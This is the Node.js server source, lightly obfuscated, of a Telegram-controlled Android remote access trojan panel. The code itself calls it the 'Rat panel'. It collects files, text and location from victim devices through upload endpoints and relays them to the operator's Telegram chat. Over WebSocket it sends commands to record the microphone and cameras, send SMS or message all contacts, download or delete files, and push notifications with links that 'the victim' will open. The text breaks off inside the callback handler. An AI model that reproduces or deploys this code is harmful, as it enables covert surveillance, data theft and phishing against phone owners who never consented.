const express = require("express");
const webSocket = require("ws");
const http = require("http");
const telegramBot = require("node-telegram-bot-api");
const uuid4 = require("uuid");
const multer = require("multer");
const bodyParser = require("body-parser");
const axios = require("axios");
const token = "your token here";
const id = "chat id here";
const address = "https://www.google.com";
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map;
const upload = multer();
app.use(bodyParser.json());
let currentUuid = "";
let currentNumber = "";
let currentTitle = "";
app.get("/", function (_0xeb57xa, _0xeb57xb) {
  _0xeb57xb.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>');
});
app.post("/uploadFile", upload.single("file"), (_0xeb57xa, _0xeb57xb) => {
  const _0xeb57xc = _0xeb57xa.file.originalname;
  appBot.sendDocument(id, _0xeb57xa.file.buffer, {caption: `${"°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>"}${_0xeb57xa.headers.model}${"</b> 𝙙𝙚𝙫𝙞𝙘𝙚"}`, parse_mode: "HTML"}, {filename: _0xeb57xc, contentType: "application/txt"});
  _0xeb57xb.send("");
});
app.post("/uploadText", (_0xeb57xa, _0xeb57xb) => {
  appBot.sendMessage(id, `${"°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>"}${_0xeb57xa.headers.model}${"</b> 𝙙𝙚𝙫𝙞𝙘𝙚\\n\\n"}` + _0xeb57xa.body.text, {parse_mode: "HTML"});
  _0xeb57xb.send("");
});
app.post("/uploadLocation", (_0xeb57xa, _0xeb57xb) => {
  appBot.sendLocation(id, _0xeb57xa.body.lat, _0xeb57xa.body.lon);
  appBot.sendMessage(id, `${"°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>"}${_0xeb57xa.headers.model}${"</b> 𝙙𝙚𝙫𝙞𝙘𝙚"}`, {parse_mode: "HTML"});
  _0xeb57xb.send("");
});
appSocket.on("connection", (_0xeb57xd, _0xeb57xa) => {
  const _0xeb57xe = uuid4.v4();
  const _0xeb57xf = _0xeb57xa.headers.model;
  const _0xeb57x10 = _0xeb57xa.headers.battery;
  const _0xeb57x11 = _0xeb57xa.headers.version;
  const _0xeb57x12 = _0xeb57xa.headers.brightness;
  const _0xeb57x13 = _0xeb57xa.headers.provider;
  _0xeb57xd.uuid = _0xeb57xe;
  appClients.set(_0xeb57xe, {model: _0xeb57xf, battery: _0xeb57x10, version: _0xeb57x11, brightness: _0xeb57x12, provider: _0xeb57x13});
  appBot.sendMessage(id, `${"°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\\n\\n"}` + `${"• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>"}${_0xeb57xf}${"</b>\\n"}` + `${"• ʙᴀᴛᴛᴇʀʏ : <b>"}${_0xeb57x10}${"</b>\\n"}` + `${"• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>"}${_0xeb57x11}${"</b>\\n"}` + `${"• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>"}${_0xeb57x12}${"</b>\\n"}` + `${"• ᴘʀᴏᴠɪᴅᴇʀ : <b>"}${_0xeb57x13}${"</b>"}`, {parse_mode: "HTML"});
  _0xeb57xd.on("close", function () {
    appBot.sendMessage(id, `${"°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\\n\\n"}` + `${"• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>"}${_0xeb57xf}${"</b>\\n"}` + `${"• ʙᴀᴛᴛᴇʀʏ : <b>"}${_0xeb57x10}${"</b>\\n"}` + `${"• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>"}${_0xeb57x11}${"</b>\\n"}` + `${"• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>"}${_0xeb57x12}${"</b>\\n"}` + `${"• ᴘʀᴏᴠɪᴅᴇʀ : <b>"}${_0xeb57x13}${"</b>"}`, {parse_mode: "HTML"});
    appClients.delete(_0xeb57xd.uuid);
  });
});
appBot.on("message", _0xeb57x14 => {
  const _0xeb57x15 = _0xeb57x14.chat.id;
  if (_0xeb57x14.reply_to_message) {
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎")) {
      currentNumber = _0xeb57x14.text;
      appBot.sendMessage(id, "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ", {reply_markup: {force_reply: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧")) {
      appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
        if (_0xeb57xd.uuid == currentUuid) {
          _0xeb57xd.send(`${"send_message:"}${currentNumber}${"/"}${_0xeb57x14.text}${""}`);
        }
      });
      currentNumber = "";
      currentUuid = "";
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨")) {
      const _0xeb57x17 = _0xeb57x14.text;
      appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
        if (_0xeb57xd.uuid == currentUuid) {
          _0xeb57xd.send(`${"send_message_to_all:"}${_0xeb57x17}${""}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙")) {
      const _0xeb57x18 = _0xeb57x14.text;
      appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
        if (_0xeb57xd.uuid == currentUuid) {
          _0xeb57xd.send(`${"file:"}${_0xeb57x18}${""}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚")) {
      const _0xeb57x18 = _0xeb57x14.text;
      appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
        if (_0xeb57xd.uuid == currentUuid) {
          _0xeb57xd.send(`${"delete_file:"}${_0xeb57x18}${""}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙")) {
      const _0xeb57x19 = _0xeb57x14.text;
      appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
        if (_0xeb57xd.uuid == currentUuid) {
          _0xeb57xd.send(`${"microphone:"}${_0xeb57x19}${""}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙")) {
      const _0xeb57x19 = _0xeb57x14.text;
      appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
        if (_0xeb57xd.uuid == currentUuid) {
          _0xeb57xd.send(`${"rec_camera_main:"}${_0xeb57x19}${""}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙")) {
      const _0xeb57x19 = _0xeb57x14.text;
      appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
        if (_0xeb57xd.uuid == currentUuid) {
          _0xeb57xd.send(`${"rec_camera_selfie:"}${_0xeb57x19}${""}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚")) {
      const _0xeb57x1a = _0xeb57x14.text;
      appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
        if (_0xeb57xd.uuid == currentUuid) {
          _0xeb57xd.send(`${"toast:"}${_0xeb57x1a}${""}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣")) {
      const _0xeb57x1b = _0xeb57x14.text;
      currentTitle = _0xeb57x1b;
      appBot.sendMessage(id, "°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ", {reply_markup: {force_reply: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣")) {
      const _0xeb57x1c = _0xeb57x14.text;
      appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
        if (_0xeb57xd.uuid == currentUuid) {
          _0xeb57xd.send(`${"show_notification:"}${currentTitle}${"/"}${_0xeb57x1c}${""}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
    ;
    if (_0xeb57x14.reply_to_message.text.includes("°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮")) {
      const _0xeb57x1d = _0xeb57x14.text;
      appSocket.clients.forEach(function _0xeb57x16(_0xeb57xd) {
        if (_0xeb57xd.uuid == currentUuid) {
          _0xeb57xd.send(`${"play_audio:"}${_0xeb57x1d}${""}`);
        }
      });
      currentUuid = "";
      appBot.sendMessage(id, "°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
  }
  ;
  if (id == _0xeb57x15) {
    if (_0xeb57x14.text == "/start") {
      appBot.sendMessage(id, "°• 𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙍𝙖𝙩 𝙥𝙖𝙣𝙚𝙡\n\n• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ", {parse_mode: "HTML", reply_markup: {keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]], resize_keyboard: true}});
    }
    ;
    if (_0xeb57x14.text == "𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨") {
      if (appClients.size == 0) {
        appBot.sendMessage(id, "°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ");
      } else {
        let _0xeb57x1e = "°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n";
        appClients.forEach(function (_0xeb57x1f, _0xeb57x20, _0xeb57x21) {
          _0xeb57x1e += `${"• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>"}${_0xeb57x1f.model}${"</b>\\n"}` + `${"• ʙᴀᴛᴛᴇʀʏ : <b>"}${_0xeb57x1f.battery}${"</b>\\n"}` + `${"• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>"}${_0xeb57x1f.version}${"</b>\\n"}` + `${"• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>"}${_0xeb57x1f.brightness}${"</b>\\n"}` + `${"• ᴘʀᴏᴠɪᴅᴇʀ : <b>"}${_0xeb57x1f.provider}${"</b>\\n\\n"}`;
        });
        appBot.sendMessage(id, _0xeb57x1e, {parse_mode: "HTML"});
      }
    }
    ;
    if (_0xeb57x14.text == "𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙") {
      if (appClients.size == 0) {
        appBot.sendMessage(id, "°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ");
      } else {
        const _0xeb57x22 = [];
        appClients.forEach(function (_0xeb57x1f, _0xeb57x20, _0xeb57x21) {
          _0xeb57x22.push([{text: _0xeb57x1f.model, callback_data: "device:" + _0xeb57x20}]);
        });
        appBot.sendMessage(id, "°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙙", {reply_markup: {inline_keyboard: _0xeb57x22}});
      }
    }
  } else {
    appBot.sendMessage(id, "°• 𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝙙𝙚𝙣𝙞𝙚𝙙");
  }
});
appBot.on("callback_query", _0xeb57x23 => {
  const _0xeb57x24 = _0xeb57x23.message;
  const _0xeb57x25 = _0xeb57x23.data;
  const _0xeb57x26 = _0xeb57x25.split(":")[0];
  const _0xeb57xe = _0xeb57x25.split(":")[1];
  console.log(_0xeb57xe);
  if (_0xeb57x26 == "device") {
